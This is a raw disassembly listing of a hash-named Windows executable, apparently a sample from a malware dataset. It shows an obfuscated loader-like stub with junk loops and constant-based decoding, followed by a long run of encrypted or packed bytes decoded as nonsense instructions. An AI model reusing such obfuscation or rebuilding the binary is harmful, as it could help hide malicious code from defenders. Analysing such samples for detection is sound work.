
f3f7878e143dd381981496f689d53e94a8168036b291b9229544e6094e57fc08.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x90
  401009:	push   esi
  40100a:	and    DWORD PTR ds:0x42a010,0x0
  401014:	jmp    0x401024
  401019:	mov    eax,ds:0x42a010
  40101e:	inc    eax
  40101f:	mov    ds:0x42a010,eax
  401024:	cmp    DWORD PTR ds:0x42a010,0x1d
  40102b:	jae    0x401072
  401031:	cmp    DWORD PTR ds:0x42a010,0xc
  401038:	jne    0x40104c
  40103e:	push   0x42900c
  401043:	push   DWORD PTR [ebp-0x18]
  401046:	call   DWORD PTR ds:0x424014
  40104c:	cmp    DWORD PTR ds:0x42a010,0xb
  401053:	jne    0x401067
  401059:	xor    eax,eax
  40105b:	xor    eax,DWORD PTR ds:0x42a010
  401061:	inc    eax
  401062:	mov    ds:0x42a010,eax
  401067:	jmp    0x401019
  40106c:	adc    ecx,0xcd5
  401072:	push   edi
  401073:	mov    DWORD PTR ds:0x42b004,0x1e
  40107d:	cmp    DWORD PTR ds:0x42b004,0x0
  401084:	je     0x4010e3
  40108a:	cmp    DWORD PTR ds:0x42b004,0x2b
  401091:	jne    0x4010bf
  401097:	push   DWORD PTR [ebp-0x10]
  40109a:	push   0x42b010
  40109f:	push   0x2447
  4010a4:	push   0x42b00c
  4010a9:	push   0x8949
  4010ae:	push   DWORD PTR [ebp-0x14]
  4010b1:	push   DWORD PTR [ebp-0x10]
  4010b4:	push   0x13a5
  4010b9:	call   DWORD PTR ds:0x424018
  4010bf:	xor    esi,esi
  4010c1:	or     esi,DWORD PTR ds:0x42b004
  4010c7:	dec    esi
  4010c8:	mov    DWORD PTR ds:0x42b004,esi
  4010ce:	jmp    0x40107d
  4010d3:	mov    eax,ds:0x42a004
  4010d8:	adc    eax,DWORD PTR ds:0x42b00c
  4010de:	mov    ds:0x42a004,eax
  4010e3:	mov    eax,ds:0x421c66
  4010e8:	mov    DWORD PTR [ebp-0x2c],eax
  4010eb:	and    DWORD PTR ds:0x428010,0x0
  4010f5:	mov    ecx,DWORD PTR ds:0x428010
  4010fb:	inc    ecx
  4010fc:	mov    DWORD PTR ds:0x428010,ecx
  401102:	cmp    DWORD PTR ds:0x428010,0x2d
  401109:	jne    0x401118
  40110f:	push   DWORD PTR [ebp-0xc]
  401112:	call   DWORD PTR ds:0x42401c
  401118:	cmp    DWORD PTR ds:0x428010,0x1f
  40111f:	jb     0x4010f5
  401125:	mov    eax,ds:0x421d72
  40112a:	and    DWORD PTR ds:0x42b008,ebx
  401130:	mov    DWORD PTR [ebp-0x3c],eax
  401133:	sbb    DWORD PTR ds:0x42b010,ebx
  401139:	and    DWORD PTR [ebp-0x34],0x0
  40113d:	or     eax,0x2114
  401142:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  401149:	xor    eax,eax
  40114b:	or     eax,DWORD PTR ds:0x429008
  401151:	xor    DWORD PTR ds:0x428008,eax
  401157:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40115e:	mov    eax,DWORD PTR [ebp-0x1c]
  401161:	add    edi,DWORD PTR ds:0x429008
  401167:	mov    ecx,DWORD PTR [ebp-0x1c]
  40116a:	add    edi,esi
  40116c:	xor    eax,ecx
  40116e:	add    DWORD PTR ds:0x428024,edx
  401174:	mov    DWORD PTR [ebp-0x1c],eax
  401177:	and    DWORD PTR ds:0x42c000,0x0
  401181:	xor    eax,eax
  401183:	or     eax,DWORD PTR ds:0x42c000
  401189:	inc    eax
  40118a:	mov    ds:0x42c000,eax
  40118f:	cmp    DWORD PTR ds:0x42c000,0x19
  401196:	jne    0x4011a8
  40119c:	push   DWORD PTR [ebp-0x1c]
  40119f:	push   DWORD PTR [ebp-0xc]
  4011a2:	call   DWORD PTR ds:0x424020
  4011a8:	cmp    DWORD PTR ds:0x42c000,0x14
  4011af:	jb     0x401181
  4011b5:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  4011bc:	xor    DWORD PTR ds:0x428014,0x3e14
  4011c6:	mov    eax,DWORD PTR [ebp-0x28]
  4011c9:	sbb    edi,ecx
  4011cb:	mov    ecx,DWORD PTR [ebp-0x28]
  4011ce:	and    DWORD PTR ds:0x42a008,0x0
  4011d8:	mov    esi,DWORD PTR ds:0x42a008
  4011de:	inc    esi
  4011df:	mov    DWORD PTR ds:0x42a008,esi
  4011e5:	cmp    DWORD PTR ds:0x42a008,0x7
  4011ec:	jne    0x40121a
  4011f2:	push   0x42b018
  4011f7:	push   0x2bd6
  4011fc:	push   DWORD PTR [ebp-0x14]
  4011ff:	push   0x428004
  401204:	push   DWORD PTR [ebp-0x20]
  401207:	push   0x4237f2
  40120c:	push   0x1e5d
  401211:	push   DWORD PTR [ebp-0x28]
  401214:	call   DWORD PTR ds:0x424024
  40121a:	cmp    DWORD PTR ds:0x42a008,0x6
  401221:	jne    0x401234
  401227:	mov    esi,DWORD PTR ds:0x42a008
  40122d:	inc    esi
  40122e:	mov    DWORD PTR ds:0x42a008,esi
  401234:	cmp    DWORD PTR ds:0x42a008,0x16
  40123b:	jb     0x4011d8
  401241:	sub    DWORD PTR ds:0x42c00c,0x2ac6
  40124b:	xor    eax,ecx
  40124d:	dec    ecx
  40124e:	mov    DWORD PTR [ebp-0x28],eax
  401251:	and    DWORD PTR ds:0x428018,0x0
  40125b:	jmp    0x40126d
  401260:	mov    edi,DWORD PTR ds:0x428018
  401266:	inc    edi
  401267:	mov    DWORD PTR ds:0x428018,edi
  40126d:	cmp    DWORD PTR ds:0x428018,0x1f
  401274:	jae    0x4012b7
  40127a:	cmp    DWORD PTR ds:0x428018,0x11
  401281:	jne    0x401298
  401287:	push   0x4738
  40128c:	push   DWORD PTR [ebp-0x10]
  40128f:	push   DWORD PTR [ebp-0x24]
  401292:	call   DWORD PTR ds:0x424028
  401298:	cmp    DWORD PTR ds:0x428018,0x10
  40129f:	jne    0x4012b2
  4012a5:	mov    edi,DWORD PTR ds:0x428018
  4012ab:	inc    edi
  4012ac:	mov    DWORD PTR ds:0x428018,edi
  4012b2:	jmp    0x401260
  4012b7:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  4012be:	mov    eax,DWORD PTR [ebp-0x18]
  4012c1:	and    DWORD PTR ds:0x428020,0x0
  4012cb:	mov    ecx,DWORD PTR ds:0x428020
  4012d1:	inc    ecx
  4012d2:	mov    DWORD PTR ds:0x428020,ecx
  4012d8:	cmp    DWORD PTR ds:0x428020,0x15
  4012df:	jne    0x4012f5
  4012e5:	push   0x4238b9
  4012ea:	push   0x42393d
  4012ef:	call   DWORD PTR ds:0x424030
  4012f5:	cmp    DWORD PTR ds:0x428020,0x14
  4012fc:	jb     0x4012cb
  401302:	mov    ecx,DWORD PTR [ebp-0x18]
  401305:	and    DWORD PTR ds:0x42b000,0x0
  40130f:	jmp    0x401321
  401314:	mov    edi,DWORD PTR ds:0x42b000
  40131a:	inc    edi
  40131b:	mov    DWORD PTR ds:0x42b000,edi
  401321:	cmp    DWORD PTR ds:0x42b000,0x19
  401328:	jae    0x401378
  40132e:	cmp    DWORD PTR ds:0x42b000,0xa
  401335:	jne    0x401359
  40133b:	push   DWORD PTR [ebp-0x18]
  40133e:	push   0x3609
  401343:	push   DWORD PTR [ebp-0xc]
  401346:	push   DWORD PTR [ebp-0x18]
  401349:	push   0x6b70
  40134e:	push   0x42901c
  401353:	call   DWORD PTR ds:0x424038
  401359:	cmp    DWORD PTR ds:0x42b000,0x9
  401360:	jne    0x401373
  401366:	mov    edi,DWORD PTR ds:0x42b000
  40136c:	inc    edi
  40136d:	mov    DWORD PTR ds:0x42b000,edi
  401373:	jmp    0x401314
  401378:	xor    eax,ecx
  40137a:	mov    DWORD PTR [ebp-0x18],eax
  40137d:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  401384:	mov    eax,DWORD PTR [ebp-0x24]
  401387:	mov    ecx,DWORD PTR [ebp-0x24]
  40138a:	xor    eax,ecx
  40138c:	mov    DWORD PTR [ebp-0x24],eax
  40138f:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  401396:	mov    eax,DWORD PTR [ebp-0x14]
  401399:	mov    ecx,DWORD PTR [ebp-0x14]
  40139c:	xor    eax,ecx
  40139e:	mov    DWORD PTR [ebp-0x14],eax
  4013a1:	mov    eax,DWORD PTR [ebp-0x20]
  4013a4:	mov    ecx,DWORD PTR [ebp-0x14]
  4013a7:	mov    esi,0x7510893
  4013ac:	xor    eax,esi
  4013ae:	mov    edi,0x3272db
  4013b3:	add    eax,edi
  4013b5:	xor    eax,ecx
  4013b7:	mov    DWORD PTR [ebp-0x14],eax
  4013ba:	mov    eax,DWORD PTR [ebp-0x10]
  4013bd:	mov    ecx,DWORD PTR [ebp-0x10]
  4013c0:	sub    eax,ecx
  4013c2:	mov    DWORD PTR [ebp-0x10],eax
  4013c5:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  4013cc:	mov    al,BYTE PTR [ebp-0x1]
  4013cf:	movzx  ecx,BYTE PTR [ebp-0x1]
  4013d3:	movzx  eax,al
  4013d6:	sub    ecx,eax
  4013d8:	mov    BYTE PTR [ebp-0x1],cl
  4013db:	movzx  eax,BYTE PTR [ebp-0x1]
  4013df:	xor    eax,0xffffff99
  4013e2:	mov    BYTE PTR [ebp-0x1],al
  4013e5:	mov    eax,DWORD PTR [ebp-0x20]
  4013e8:	xor    eax,esi
  4013ea:	add    eax,edi
  4013ec:	mov    DWORD PTR [ebp-0x14],eax
  4013ef:	lea    eax,[ebp-0x40]
  4013f2:	mov    DWORD PTR [ebp-0x38],eax
  4013f5:	lea    eax,[ebp-0x38]
  4013f8:	mov    DWORD PTR [ebp-0x44],eax
  4013fb:	lea    eax,[ebp-0x44]
  4013fe:	mov    DWORD PTR [ebp-0x8],eax
  401401:	lea    eax,[ebp-0x8]
  401404:	mov    DWORD PTR [ebp-0x48],eax
  401407:	mov    eax,DWORD PTR [ebp-0x18]
  40140a:	xor    eax,esi
  40140c:	add    eax,edi
  40140e:	push   eax
  40140f:	mov    eax,DWORD PTR [ebp-0x1c]
  401412:	xor    eax,esi
  401414:	add    eax,edi
  401416:	push   eax
  401417:	mov    eax,DWORD PTR [ebp-0x10]
  40141a:	xor    eax,esi
  40141c:	add    eax,edi
  40141e:	push   eax
  40141f:	lea    eax,[ebp-0x90]
  401425:	push   eax
  401426:	push   DWORD PTR [ebp-0x20]
  401429:	push   DWORD PTR [ebp-0x30]
  40142c:	jmp    0x4037ee
  401431:	mov    al,0x4c
  401433:	cmp    BYTE PTR [edx+0x44b086b4],cl
  401439:	ss ins DWORD PTR es:[edi],dx
  40143b:	dec    edi
  40143c:	clc    
  40143d:	jne    0x4014be
  40143f:	arpl   WORD PTR ds:0x62626262,bp
  401445:	fstp   QWORD PTR [edi+0x62]
  401448:	bound  ecx,QWORD PTR [ecx]
  40144a:	sub    DWORD PTR [edi],eax
  40144c:	pop    eax
  40144d:	add    eax,0x792e0358
  401452:	pop    ecx
  401453:	jne    0x40149a
  401455:	lods   al,BYTE PTR ds:[esi]
  401456:	sbb    dh,BYTE PTR [edx+0x42]
  401459:	jno    0x401482
  40145b:	into   
  40145c:	push   eax
  40145d:	hlt    
  40145e:	and    al,0xd4
  401460:	xchg   ecx,eax
  401461:	fbstp  TBYTE PTR ds:0x1153c2c8
  401467:	icebp  
  401468:	aaa    
  401469:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40146a:	add    DWORD PTR [edx-0x9],ebx
  40146d:	mov    al,ds:0xb465e64e
  401472:	in     al,dx
  401473:	(bad)  
  401474:	pop    eax
  401475:	cmp    esi,esi
  401477:	pushf  
  401478:	mov    ds:0x6b01003,eax
  40147d:	add    DWORD PTR [ebx-0x153fb6cb],0xa
  401484:	(bad)  
  401485:	scas   al,BYTE PTR es:[edi]
  401486:	sahf   
  401487:	test   eax,0x86999f74
  40148c:	js     0x4014a2
  40148e:	iret   
  40148f:	mov    edx,0xac6df4d7
  401494:	test   eax,0xdc9e713b
  401499:	xlat   BYTE PTR ds:[ebx]
  40149a:	rcr    BYTE PTR [esi+ebp*4+0x44a3fedb],0xc2
  4014a2:	aam    0x3
  4014a4:	dec    ebx
  4014a5:	std    
  4014a6:	mov    al,0x60
  4014a8:	in     eax,dx
  4014a9:	fbstp  TBYTE PTR [edx+0x7a8c4260]
  4014af:	push   ds
  4014b0:	pusha  
  4014b1:	stc    
  4014b2:	mov    al,ds:0x958913e5
  4014b7:	cmp    eax,0x95de469d
  4014bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014bd:	loope  0x4014a5
  4014bf:	ret    0xfb84
  4014c2:	push   ecx
  4014c3:	sub    eax,0x8f09f6d7
  4014c8:	(bad)  
  4014c9:	jmp    0x36a88a81
  4014ce:	pop    eax
  4014cf:	or     cl,dh
  4014d1:	inc    edx
  4014d2:	ins    BYTE PTR es:[edi],dx
  4014d3:	stos   BYTE PTR es:[edi],al
  4014d4:	cdq    
  4014d5:	aad    0x77
  4014d7:	dec    edi
  4014d8:	pop    edi
  4014d9:	xor    DWORD PTR [ebp-0x3051591a],edx
  4014df:	test   eax,0x67fbb6c2
  4014e4:	mov    edx,0x53fb3792
  4014e9:	rcr    BYTE PTR [ecx],cl
  4014eb:	out    dx,al
  4014ec:	pop    edx
  4014ed:	idiv   dl
  4014ef:	xor    al,cl
  4014f1:	lods   al,BYTE PTR ds:[esi]
  4014f2:	inc    esi
  4014f3:	xor    DWORD PTR [ecx+edi*4+0x13356d7f],ecx
  4014fa:	cmc    
  4014fb:	jne    0x4014ab
  4014fd:	push   cs
  4014fe:	push   0x3f96bf88
  401503:	xchg   edx,eax
  401504:	ror    ebx,0x6e
  401507:	sub    esp,DWORD PTR [eax+0x1498e410]
  40150d:	jmp    DWORD PTR [eax+0x47d208aa]
  401513:	lds    esi,FWORD PTR [ecx-0x42426dc8]
  401519:	mov    cl,0x20
  40151b:	fistp  DWORD PTR [esi+0x2deac9b6]
  401521:	das    
  401522:	popf   
  401523:	jb     0x401548
  401525:	es sbb ch,BYTE PTR ds:[edi+ecx*2+0x75a686b3]
  40152e:	xchg   ebx,eax
  40152f:	pushf  
  401530:	dec    ebx
  401531:	mov    cl,0x25
  401533:	pop    esp
  401534:	sbb    al,0xc7
  401536:	lahf   
  401537:	out    0x71,al
  401539:	lock lds ebp,FWORD PTR [edx]
  40153c:	mov    ecx,ebp
  40153e:	loop   0x401550
  401540:	out    dx,eax
  401541:	nop
  401542:	sar    BYTE PTR [esi-0x52],1
  401545:	daa    
  401546:	dec    ecx
  401547:	xor    ch,BYTE PTR [esi]
  401549:	adc    eax,0x6d16aa00
  40154e:	mov    esp,0x607a293f
  401553:	add    esp,DWORD PTR ds:0x3cfb76fe
  401559:	lds    edx,FWORD PTR [ebx]
  40155b:	pop    edx
  40155c:	push   cs
  40155d:	xor    esp,DWORD PTR [edx+eiz*2+0x60b30a0d]
  401564:	inc    eax
  401565:	lahf   
  401566:	into   
  401567:	fadd   DWORD PTR [edi-0x49c24ba]
  40156d:	inc    edi
  40156e:	jne    0x4015c7
  401570:	es aad 0xde
  401573:	mov    edx,cs
  401575:	cmc    
  401576:	in     al,0xf9
  401578:	mov    DWORD PTR [esi+0x460a42ff],ebp
  40157e:	or     ebx,DWORD PTR [eax]
  401580:	ins    BYTE PTR es:[edi],dx
  401581:	mov    cl,0x0
  401583:	mov    eax,ds:0x3ae58721
  401588:	or     al,0x15
  40158a:	mov    cl,0xa5
  40158c:	mov    ch,0xc
  40158e:	shl    DWORD PTR [edx+ebp*4+0x16260b7e],1
  401595:	adc    DWORD PTR [edi-0x41b3a86f],ecx
  40159b:	out    dx,al
  40159c:	pop    esp
  40159d:	(bad)  
  40159e:	pop    edi
  40159f:	mov    ds:0xe63f6505,al
  4015a4:	arpl   di,di
  4015a6:	cmp    dh,BYTE PTR cs:[ebp+0x18]
  4015aa:	xor    edi,edi
  4015ac:	jp     0x401621
  4015ae:	jmp    0x4015f2
  4015b0:	sahf   
  4015b1:	mov    eax,0xa0976cc8
  4015b6:	add    esi,DWORD PTR [ebx-0x75]
  4015b9:	sub    BYTE PTR [esi],cl
  4015bb:	pop    ebx
  4015bc:	jg     0x40156e
  4015be:	inc    esi
  4015bf:	sbb    ebp,ecx
  4015c1:	stos   DWORD PTR es:[edi],eax
  4015c2:	call   0x8533:0x84dd31d1
  4015c9:	test   eax,edi
  4015cb:	(bad)  
  4015cc:	into   
  4015cd:	fidivr DWORD PTR [eax-0x49b12f6d]
  4015d3:	mov    al,ds:0x147c0e5b
  4015d8:	xchg   BYTE PTR [eax-0x74],bl
  4015db:	pop    esi
  4015dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4015dd:	stos   BYTE PTR es:[edi],al
  4015de:	sbb    cl,BYTE PTR [edi-0x1f]
  4015e1:	fst    DWORD PTR ds:0x1e4f389
  4015e7:	clc    
  4015e8:	ss pop ebp
  4015ea:	pop    esp
  4015eb:	int3   
  4015ec:	test   eax,0xe106b07c
  4015f1:	ret    0x7d84
  4015f4:	enter  0xe39c,0xa
  4015f8:	dec    esi
  4015f9:	and    eax,0x9732f716
  4015fe:	sbb    BYTE PTR [ebp-0x5b14e39e],0x12
  401605:	sub    BYTE PTR [edx],bh
  401607:	cmc    
  401608:	fisttp DWORD PTR [ebp+0x10b8fa07]
  40160e:	stos   BYTE PTR es:[edi],al
  40160f:	adc    ebp,DWORD PTR ds:0xa60389d3
  401615:	pop    ebp
  401616:	push   0x6e67689a
  40161b:	sub    dh,dl
  40161d:	outs   dx,DWORD PTR ds:[esi]
  40161e:	add    edi,DWORD PTR [ebp-0xe569adc]
  401624:	sub    cl,BYTE PTR [esi+ebx*2-0x8c73b45]
  40162b:	push   esp
  40162c:	shl    DWORD PTR [edi],0xf8
  40162f:	push   ss
  401630:	jbe    0x401610
  401632:	jmp    0xacf3:0x16c6c0e3
  401639:	or     eax,0xb71d30d1
  40163e:	pop    es
  40163f:	push   esp
  401640:	imul   edx,DWORD PTR [eax+esi*4+0x2a0512a3],0x35
  401648:	xor    eax,0xb2cba7e7
  40164d:	lods   eax,DWORD PTR ds:[esi]
  40164e:	xchg   ebx,eax
  40164f:	mov    bh,0x5b
  401651:	jnp    0x401618
  401653:	mov    dl,bh
  401655:	dec    esi
  401656:	push   0x36
  401658:	ror    bl,1
  40165a:	jmp    0x401632
  40165c:	repnz rcl ebp,1
  40165f:	dec    esp
  401660:	inc    eax
  401661:	sahf   
  401662:	fdivr  DWORD PTR [ebp+ecx*2-0x253b9de7]
  401669:	sub    edx,DWORD PTR [eax-0x7a]
  40166c:	mov    dh,0x8c
  40166e:	rcr    BYTE PTR [esi+edi*2],cl
  401671:	mov    ch,0xff
  401673:	test   edx,ebx
  401675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401676:	dec    eax
  401677:	gs xchg esi,eax
  401679:	xchg   edi,ecx
  40167b:	loope  0x4016d7
  40167d:	push   ds
  40167e:	sbb    bl,BYTE PTR [ecx-0x1f]
  401681:	xchg   edx,eax
  401682:	adc    BYTE PTR [edi],dh
  401684:	sub    edi,DWORD PTR ds:0xc286bc78
  40168a:	fldenv [ebx]
  40168c:	std    
  40168d:	xchg   ebx,eax
  40168e:	inc    esi
  40168f:	daa    
  401690:	dec    edi
  401691:	push   0xb5ba7f03
  401696:	jp     0x401660
  401698:	(bad)  
  401699:	inc    edi
  40169a:	pop    es
  40169b:	sti    
  40169c:	loope  0x4016ec
  40169e:	mov    ch,0xe2
  4016a0:	(bad)  
  4016a1:	idiv   eax
  4016a3:	aam    0x52
  4016a5:	pop    ss
  4016a6:	sar    DWORD PTR [eax+0x8],0xcf
  4016aa:	push   eax
  4016ab:	pop    ss
  4016ac:	cmp    DWORD PTR [ecx+0x4818896a],esp
  4016b2:	push   edi
  4016b3:	inc    edi
  4016b4:	mov    DWORD PTR [edx],ebx
  4016b6:	mov    BYTE PTR ds:0xfe6d99ac,0xab
  4016bd:	mov    esi,DWORD PTR [esi]
  4016bf:	cwde   
  4016c0:	push   edi
  4016c1:	into   
  4016c2:	shr    edx,0x40
  4016c5:	fistp  WORD PTR [esi-0x39]
  4016c8:	push   esi
  4016c9:	add    cl,BYTE PTR [edi]
  4016cb:	pop    edi
  4016cc:	add    DWORD PTR [ebp-0x63],edi
  4016cf:	cs jle 0x401748
  4016d2:	ds jecxz 0x40169a
  4016d5:	stos   BYTE PTR es:[edi],al
  4016d6:	add    DWORD PTR [edx+0x76],ebx
  4016d9:	jmp    0xb9b8:0x754fb26f
  4016e0:	bound  esp,QWORD PTR [esi+0x809350]
  4016e6:	popa   
  4016e7:	or     eax,0x413f0c50
  4016ec:	pop    ebp
  4016ed:	in     eax,dx
  4016ee:	adc    edi,edx
  4016f0:	mov    WORD PTR [ecx],gs
  4016f2:	dec    esp
  4016f3:	add    DWORD PTR [esi],edx
  4016f5:	xchg   esp,eax
  4016f6:	inc    esp
  4016f7:	xchg   ebp,eax
  4016f8:	adc    esp,ebx
  4016fa:	ss test ecx,edi
  4016fd:	aas    
  4016fe:	push   0x7f
  401700:	loop   0x401767
  401702:	bound  edx,QWORD PTR [ecx-0x7ac40644]
  401708:	lods   eax,DWORD PTR ds:[esi]
  401709:	add    ch,ah
  40170b:	hlt    
  40170c:	and    ecx,ecx
  40170e:	fyl2xp1 
  401710:	jmp    0xccfb:0xe4622d60
  401717:	mov    esp,0x477ec39
  40171c:	hlt    
  40171d:	xor    DWORD PTR [ebx],ebx
  40171f:	mov    al,0xae
  401721:	add    al,0xc1
  401723:	dec    ecx
  401724:	repnz pop ds
  401726:	(bad)  
  401727:	and    eax,0x351b01c8
  40172c:	loope  0x401767
  40172e:	adc    DWORD PTR [edi-0x250a2cd5],esi
  401734:	xlat   BYTE PTR ds:[ebx]
  401735:	adc    eax,0x57803cc2
  40173a:	sbb    DWORD PTR ds:0xa151afea,ecx
  401740:	daa    
  401741:	mov    edx,?
  401743:	pop    esp
  401744:	mov    edi,0xc4756167
  401749:	mov    ebx,0x1db06074
  40174e:	out    dx,eax
  40174f:	xor    ebx,edi
  401751:	add    BYTE PTR es:[edi+0x56cb8dda],0x35
  401759:	(bad)  
  40175a:	inc    DWORD PTR [edx-0x79]
  40175d:	cmp    dh,bh
  40175f:	add    ebx,DWORD PTR [eax]
  401761:	sti    
  401762:	cmp    dl,BYTE PTR [ecx]
  401764:	fbld   TBYTE PTR gs:[ecx+0x1224bb1a]
  40176b:	sti    
  40176c:	dec    esp
  40176d:	mov    ebp,0xcb9903e7
  401772:	rol    DWORD PTR [edx+0x1606a772],0xf3
  401779:	pop    edx
  40177a:	stos   DWORD PTR es:[edi],eax
  40177b:	mov    eax,0x6150b44a
  401780:	jo     0x40173c
  401782:	imul   DWORD PTR [ebx]
  401784:	adc    eax,0xacc60344
  401789:	rol    BYTE PTR [edx+0x24],1
  40178c:	gs stos BYTE PTR es:[edi],al
  40178e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40178f:	pop    ss
  401790:	or     eax,0x96e273e6
  401795:	test   BYTE PTR [edx+eiz*1+0xa],bh
  401799:	mov    DWORD PTR [edi-0x6bab15bc],ecx
  40179f:	pop    ss
  4017a0:	sub    ebp,esp
  4017a2:	inc    esi
  4017a3:	nop
  4017a4:	adc    DWORD PTR [esi+0x7],edx
  4017a7:	imul   edi,DWORD PTR [edx],0x16765902
  4017ad:	inc    ebx
  4017ae:	ret    
  4017af:	icebp  
  4017b0:	sbb    ebx,DWORD PTR [ebx+0x3465200e]
  4017b6:	ins    DWORD PTR es:[edi],dx
  4017b7:	outs   dx,DWORD PTR ds:[esi]
  4017b8:	std    
  4017b9:	scas   eax,DWORD PTR es:[edi]
  4017ba:	das    
  4017bb:	sub    BYTE PTR [ebx+0x78],0x6c
  4017bf:	scas   eax,DWORD PTR es:[edi]
  4017c0:	cmp    esi,DWORD PTR [eax+0x69dc061d]
  4017c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017c7:	pop    ebx
  4017c8:	pop    esp
  4017c9:	adc    esi,DWORD PTR [edi-0x1d]
  4017cc:	xor    DWORD PTR [esi],edi
  4017ce:	sbb    al,0xfa
  4017d0:	ficomp DWORD PTR [esi+ebx*2]
  4017d3:	mov    esp,0x2697d162
  4017d8:	mov    dh,0x6c
  4017da:	nop
  4017db:	lahf   
  4017dc:	out    0x4c,al
  4017de:	sub    ebp,DWORD PTR [ecx-0x45]
  4017e1:	mov    al,0xf8
  4017e3:	fs clc 
  4017e5:	fidiv  WORD PTR [esi-0x37]
  4017e8:	dec    edx
  4017e9:	pop    ss
  4017ea:	stos   DWORD PTR es:[edi],eax
  4017eb:	push   ebx
  4017ec:	scas   al,BYTE PTR es:[edi]
  4017ed:	xchg   BYTE PTR [edi+0x5a],ch
  4017f0:	sub    eax,0x3f0d21d5
  4017f5:	pop    ds
  4017f6:	paddw  mm5,QWORD PTR [eax+0x75c8262e]
  4017fd:	hlt    
  4017fe:	adc    ebp,ebx
  401800:	fnstsw WORD PTR [esi+0x58]
  401803:	lahf   
  401804:	retf   
  401805:	mov    ebp,0x1a67e526
  40180a:	shl    ebx,0x21
  40180d:	xchg   DWORD PTR [edx+eax*4+0x36c2cff4],edx
  401814:	addr16 jg 0x401816
  401817:	xor    BYTE PTR [edx],bl
  401819:	and    BYTE PTR [eax-0x8bb5001],ch
  40181f:	adc    DWORD PTR [eax-0x76],edx
  401822:	jne    0x401806
  401824:	stc    
  401825:	lock stos BYTE PTR es:[edi],al
  401827:	cs retf 0xfb2e
  40182b:	pop    ecx
  40182c:	ja     0x40189b
  40182e:	add    ecx,DWORD PTR [ebp+0x5b]
  401831:	int    0x71
  401833:	fwait
  401834:	mov    eax,ds:0xddd78219
  401839:	jo     0x401812
  40183b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40183c:	jl     0x401858
  40183e:	aad    0xb6
  401840:	(bad)  
  401841:	hlt    
  401842:	and    ebp,DWORD PTR [edx+0x42]
  401845:	adc    DWORD PTR [esi-0x25],eax
  401848:	shr    DWORD PTR [ebx],cl
  40184a:	iret   
  40184b:	adc    edi,edx
  40184d:	pop    esi
  40184e:	cs out dx,al
  401850:	mov    ds:0x5bfccaba,eax
  401855:	jo     0x401878
  401857:	sbb    eax,0xb5a2f7d1
  40185c:	xor    al,0x19
  40185e:	push   0x33
  401860:	push   ecx
  401861:	cmc    
  401862:	sbb    esp,ecx
  401864:	leave  
  401865:	std    
  401866:	mov    esi,0x25fce817
  40186b:	in     eax,dx
  40186c:	les    esi,FWORD PTR [eax+0x22ad4466]
  401872:	mov    ah,0xe4
  401874:	inc    eax
  401875:	jecxz  0x4017fa
  401877:	or     BYTE PTR [eax-0x53964094],al
  40187d:	rol    DWORD PTR [edx],0x52
  401880:	and    esi,DWORD PTR [eax+0xc]
  401883:	cmp    al,BYTE PTR [edx-0x43]
  401886:	jp     0x4018e1
  401888:	push   es
  401889:	or     ecx,DWORD PTR [ecx+0x6d0fd1c6]
  40188f:	adc    dl,BYTE PTR [eax]
  401891:	sahf   
  401892:	inc    ebp
  401893:	jle    0x40189a
  401895:	sbb    DWORD PTR [ebp+0x3e],eax
  401898:	fiadd  DWORD PTR [ebx-0x1f096ae0]
  40189e:	rcr    bh,cl
  4018a0:	retf   
  4018a1:	mov    ds:0x303dff73,eax
  4018a6:	mov    dl,BYTE PTR [edi-0x46]
  4018a9:	ss int 0x43
  4018ac:	pop    ebp
  4018ad:	fnstenv [ebx]
  4018af:	push   ebx
  4018b0:	es inc ebp
  4018b2:	pop    esp
  4018b3:	xchg   esi,eax
  4018b4:	xor    al,0x76
  4018b6:	fs neg ah
  4018b9:	or     BYTE PTR [ebp-0x17771cf3],al
  4018bf:	rol    DWORD PTR [esi],cl
  4018c1:	sti    
  4018c2:	rcr    DWORD PTR [ebx],cl
  4018c4:	mov    ebx,0x6f353804
  4018c9:	add    DWORD PTR ds:0x71eb4e52,esi
  4018cf:	shl    ebx,cl
  4018d1:	gs mov bh,0xa6
  4018d5:	fisttp WORD PTR [edx+0x3856d550]
  4018db:	pop    edi
  4018dc:	jns    0x401912
  4018de:	and    DWORD PTR ds:0x9aa1860a,esp
  4018e4:	popf   
  4018e5:	jmp    0xb050ff77
  4018ea:	fimul  DWORD PTR [edx]
  4018ec:	or     DWORD PTR [edx+0x6d],0xffffffb7
  4018f0:	mov    ?,ebx
  4018f2:	mov    cl,0xed
  4018f4:	mov    bl,0xa6
  4018f6:	mov    ch,0x61
  4018f8:	cli    
  4018f9:	sub    DWORD PTR [ebp+0x1057e2a9],ecx
  4018ff:	lods   eax,DWORD PTR ds:[esi]
  401900:	add    al,0xbe
  401902:	xlat   BYTE PTR ds:[ebx]
  401903:	mov    ?,WORD PTR [edi-0x2c]
  401906:	loope  0x4018c5
  401908:	mov    dl,0xed
  40190a:	mov    DWORD PTR [ebx-0x57],0x52c7cc80
  401911:	ror    BYTE PTR [esp+esi*4],cl
  401914:	adc    cl,dl
  401916:	xchg   edi,eax
  401917:	jnp    0x4018c2
  401919:	mov    al,0xa
  40191b:	jp     0x40189f
  40191d:	popa   
  40191e:	mov    ebp,DWORD PTR [ecx+0x2ccc254a]
  401924:	shl    BYTE PTR [ebp+0x5c],0x21
  401928:	dec    edx
  401929:	call   0x9ab0:0xb15a4314
  401930:	dec    esi
  401931:	pushf  
  401932:	jp     0x401989
  401934:	adc    al,bl
  401936:	and    bl,BYTE PTR es:[eax+0x62cfd277]
  40193d:	cdq    
  40193e:	shl    BYTE PTR [edi+0x65],1
  401941:	test   DWORD PTR [eax+0x100fc315],edx
  401947:	ja     0x4018cd
  401949:	cld    
